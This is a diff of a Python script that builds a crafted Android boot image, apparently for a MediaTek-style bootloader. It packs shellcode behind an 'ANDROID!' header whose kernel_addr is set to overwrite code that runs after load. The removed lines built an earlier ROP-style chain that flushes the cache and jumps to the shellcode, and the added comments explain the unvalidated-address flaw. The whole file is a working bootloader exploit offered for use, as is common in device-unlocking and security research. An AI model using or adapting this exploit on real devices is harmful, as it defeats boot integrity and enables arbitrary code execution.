@@ -1,87 +1,85 @@
 #!/usr/bin/env python3
+
 import sys
 import struct
 
-base = 0x46000000
+from pathlib import Path
 
-crafted_hdr_sz = 0x70
-page_size = 4
-inject_addr = 0x461416a0
-inject_sz = 0x200 - crafted_hdr_sz
+debug = True
 
-arch_clean_invalidate_cache_range = 0x4601C5A0
+page_size = 0x800
+inject_addr = 0x460038C4
+
+def dprint(*args, **kwargs):
+    if debug:
+        print(*args, **kwargs)
+
+def align_page(size):
+    return ((size + page_size - 1) // page_size) * page_size
 
 def main():
-    input_file = None
-    payload_file = "build/payload.bin"
-    output_file = "../bin/microloader.bin"
-    
+    output = Path.cwd().parent / 'bin' / 'microloader.bin'
+    payload_path = Path.cwd() / 'build' / 'payload.bin'
+
     if len(sys.argv) == 2:
-        output_file = sys.argv[1]
+        output = Path(sys.argv[1]).absolute()
     elif len(sys.argv) == 3:
-        payload_file = sys.argv[1]
-        output_file = sys.argv[2]
-    elif len(sys.argv) == 4:
-        input_file = sys.argv[1]
-        payload_file = sys.argv[2]
-        output_file = sys.argv[3]
+        payload_path = Path(sys.argv[1]).absolute()
+        output = Path(sys.argv[2]).absolute()
 
-    orig = b""
-    if input_file:
-        with open(input_file, "rb") as fin:
-            orig = fin.read(0x400)
-            fin.seek(0x800)
-            orig += fin.read()
-
-    hdr = b"ANDROID!"
-    hdr += struct.pack("<II", inject_sz, inject_addr - crafted_hdr_sz + page_size)
-    hdr += struct.pack("<IIIIIIII", 0, 0, 0, 0, 0, page_size, 0, 0)
-    hdr += b"\x00" * 0x10
-    hdr += b"bootopt=64S3,32N2,32N2 buildvariant=user"
-    hdr += b"\x00" * (crafted_hdr_sz - len(hdr))
-
-    assert len(hdr) == crafted_hdr_sz
-
-    shellcode_addr = inject_addr + 0x50
-    cache_start = shellcode_addr & ~0x3f
-    cache_size = 0x100
-
-    body = b''
-    body += struct.pack("<I", cache_start)
-    body += struct.pack("<I", arch_clean_invalidate_cache_range)
-    body += struct.pack("<I", cache_size)
-    body += struct.pack("<I", 0x4601C7C8)
-
-    body += struct.pack("<I", cache_start)
-    body += struct.pack("<I", cache_size)
-    body += struct.pack("<I", 0x03030303)
-    body += struct.pack("<I", 0x04040404)
-    body += struct.pack("<I", 0x12121212)
-    body += struct.pack("<I", shellcode_addr)
-    body += struct.pack("<I", arch_clean_invalidate_cache_range)
-
-    current_len = len(body)
-    shellcode_offset = shellcode_addr - inject_addr
-    if current_len < shellcode_offset:
-        body += b"\x00" * (shellcode_offset - current_len)
-
-    print("addr = %#x" % (inject_addr + len(body)), flush=True)
-
-    with open(payload_file, "rb") as fin:
-        shellcode = fin.read()
-    body += shellcode
-
-    body += b"\x00" * (inject_sz - len(body))
-
-    hdr += body
-    hdr += b"\x00" * (0x400 - len(hdr))
-    assert len(hdr) == 0x400
-
-    if input_file:
-        hdr += orig
+    with open(payload_path, 'rb') as f:
+        shellcode = f.read()
     
-    with open(output_file, "wb") as fout:
-        fout.write(hdr)
+    payload = shellcode
+    payload_size = len(payload)
+    
+    dprint('Shellcode: %s (%d bytes)' % (payload_path, len(shellcode)))
+    dprint('Total payload: %d bytes' % payload_size)
+    dprint('Output: %s' % output)
+    dprint('Stub address: 0x%08X' % inject_addr)
 
-if __name__ == "__main__":
+    # the exploit works because when loading a 32-bit kernel, the bootloader
+    # directly uses the kernel_addr field as the destination address without
+    # validation.
+    # we exploit this by setting kernel_addr to point to a function that runs
+    # after the boot image is loaded. The bootloader then  overwrites this
+    # function with our payload, which is placed immediately after the header
+    # where the kernel is expected to be.
+    hdr = b'ANDROID!'                      # magic
+    hdr += struct.pack('<I', payload_size) # kernel_size
+    hdr += struct.pack('<I', inject_addr)  # kernel_addr
+    hdr += struct.pack('<I', 0)            # ramdisk_size
+    hdr += struct.pack('<I', 0)            # ramdisk_addr
+    hdr += struct.pack('<I', 0)            # second_size
+    hdr += struct.pack('<I', 0)            # second_addr
+    hdr += struct.pack('<I', 0)            # tags_addr
+    hdr += struct.pack('<I', page_size)    # page_size
+    hdr += struct.pack('<I', 0)            # unused
+    hdr += struct.pack('<I', 0)            # os_version
+    hdr += b'\x00' * 16                    # name[16]
+    
+    cmdline = b'bootopt=64S3,32N2,32N2 buildvariant=user'
+    hdr += cmdline                         # cmdline[512]
+    hdr += b'\x00' * (512 - len(cmdline))
+    hdr += b'\x00' * 32                    # id[8] (uint32_t)
+    hdr += b'\x00' * 1024                  # extra_cmdline[1024]
+    
+    hdr += b'\x00' * (page_size - len(hdr))
+    assert len(hdr) == page_size
+    
+    # align the payload to page boundary
+    img = hdr + payload
+    img += b'\x00' * (align_page(payload_size) - payload_size)
+    
+    total_size = len(img)
+    dprint('Boot image size: %d bytes' % total_size)
+    dprint('Header: %d bytes' % page_size)
+    dprint('Payload section: %d bytes' % align_page(payload_size))
+    
+    with open(output, 'wb') as f:
+        f.write(img)
+    
+    dprint('Written to %s' % output)
+
+if __name__ == '__main__':
     main()
